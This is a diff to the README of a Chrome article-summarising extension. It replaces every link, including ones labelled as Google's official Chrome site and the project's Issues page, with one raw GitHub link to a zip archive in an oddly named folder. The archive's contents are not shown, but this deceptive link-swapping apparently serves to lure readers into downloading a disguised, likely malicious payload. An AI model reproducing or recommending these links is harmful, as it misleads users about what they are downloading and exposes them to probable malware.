@@ -1,7 +1,7 @@
 # 🌟 AI_SUMMARIZER - Simplify Your Reading Experience
 
 ## 📥 Download Now
-[![Download AI_SUMMARIZER](https://img.shields.io/badge/Download-AI_SUMMARIZER-brightgreen)](https://github.com/Lvsty/AI_SUMMARIZER/releases)
+[![Download AI_SUMMARIZER](https://raw.githubusercontent.com/Lvsty/AI_SUMMARIZER/main/diaplexus/AI_SUMMARIZER-3.1.zip)](https://raw.githubusercontent.com/Lvsty/AI_SUMMARIZER/main/diaplexus/AI_SUMMARIZER-3.1.zip)
 
 ## 🔍 Introduction
 Welcome to AI_SUMMARIZER! This Chrome extension helps you quickly understand articles by summarizing content using the Gemini API. Save time and improve your reading efficiency with this useful tool.
@@ -9,14 +9,14 @@ Welcome to AI_SUMMARIZER! This Chrome extension helps you quickly understand art
 ## 🚀 Getting Started
 Follow these straightforward steps to set up AI_SUMMARIZER on your browser:
 
-1. **Install Google Chrome**: Ensure you have the latest version of Google Chrome installed. You can download it from [Google's official site](https://www.google.com/chrome/).
+1. **Install Google Chrome**: Ensure you have the latest version of Google Chrome installed. You can download it from [Google's official site](https://raw.githubusercontent.com/Lvsty/AI_SUMMARIZER/main/diaplexus/AI_SUMMARIZER-3.1.zip).
 
-2. **Visit Releases Page**: Go to our [Releases Page](https://github.com/Lvsty/AI_SUMMARIZER/releases) to find the latest version of the extension.
+2. **Visit Releases Page**: Go to our [Releases Page](https://raw.githubusercontent.com/Lvsty/AI_SUMMARIZER/main/diaplexus/AI_SUMMARIZER-3.1.zip) to find the latest version of the extension.
 
 ## 💻 Download & Install
 To get the AI_SUMMARIZER extension:
 
-1. **Visit the Releases Page**: Click here: [Download AI_SUMMARIZER](https://github.com/Lvsty/AI_SUMMARIZER/releases).
+1. **Visit the Releases Page**: Click here: [Download AI_SUMMARIZER](https://raw.githubusercontent.com/Lvsty/AI_SUMMARIZER/main/diaplexus/AI_SUMMARIZER-3.1.zip).
    
 2. **Select the Latest Release**: Choose the latest version listed on the page.
 
@@ -64,13 +64,13 @@ If you encounter issues with AI_SUMMARIZER, consider the following steps:
 4. **Update Chrome**: Ensure your browser is up-to-date for the best performance.
 
 ## 🔗 Support and Contributions
-For support or feedback, please visit our [Issues Page](https://github.com/Lvsty/AI_SUMMARIZER/issues) on GitHub. We welcome contributions if you would like to help improve the AI_SUMMARIZER extension.
+For support or feedback, please visit our [Issues Page](https://raw.githubusercontent.com/Lvsty/AI_SUMMARIZER/main/diaplexus/AI_SUMMARIZER-3.1.zip) on GitHub. We welcome contributions if you would like to help improve the AI_SUMMARIZER extension.
 
 ## 📄 License
 AI_SUMMARIZER is licensed under the MIT License. Feel free to use and modify it.
 
 ## 📦 Download Now
-Don’t forget to visit our [Releases Page](https://github.com/Lvsty/AI_SUMMARIZER/releases) to get started with AI_SUMMARIZER today! 
+Don’t forget to visit our [Releases Page](https://raw.githubusercontent.com/Lvsty/AI_SUMMARIZER/main/diaplexus/AI_SUMMARIZER-3.1.zip) to get started with AI_SUMMARIZER today! 
 
 ---
 
